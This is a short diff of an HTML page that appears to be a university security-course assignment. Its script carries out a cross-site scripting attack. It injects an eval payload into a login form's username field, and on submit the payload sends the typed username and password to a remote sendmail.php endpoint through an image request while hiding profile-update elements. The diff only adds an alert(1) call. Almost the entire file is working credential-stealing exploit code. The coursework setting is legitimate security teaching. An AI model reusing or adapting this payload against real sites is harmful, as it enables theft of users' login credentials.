@@ -3,10 +3,9 @@
 	<head>
 		<script type="text/javascript">
 			window.onload = function(){
-				var attack_str=escape("document.getElementsByName('login_form')[0].addEventListener('submit', function(){(new Image()).src='http://ece568.csl.toronto.edu/a3/sendmail.php?' + 'to=wangjiec' + '&netid=yourusername' + '&payload=' + document.getElementsByName('loginusername')[0].value + document.getElementsByName('loginpassword')[0].value; + '&random=' + Math.random();  [].forEach.call(document.getElementsByClassName('profileupdate'),function(eachPU){eachPU.style.display='none';});})");
+				var attack_str=escape("document.getElementsByName('login_form')[0].addEventListener('submit', function(){(new Image()).src='http://ece568.csl.toronto.edu/a3/sendmail.php?' + 'to=wangjiec' + '&netid=yourusername' + '&payload=' + document.getElementsByName('loginusername')[0].value + document.getElementsByName('loginpassword')[0].value; + '&random=' + Math.random(); [].forEach.call(document.getElementsByClassName('profileupdate'),function(eachPU){eachPU.style.display='none';}); alert(1);})");
 				document.getElementsByName("loginusername")[0].value="'' onfocus=(function(){eval(unescape('" + attack_str + "'));})();";
 				document.getElementsByName("login_form")[0].submit();
-
 			};
 		</script>
 	</head>
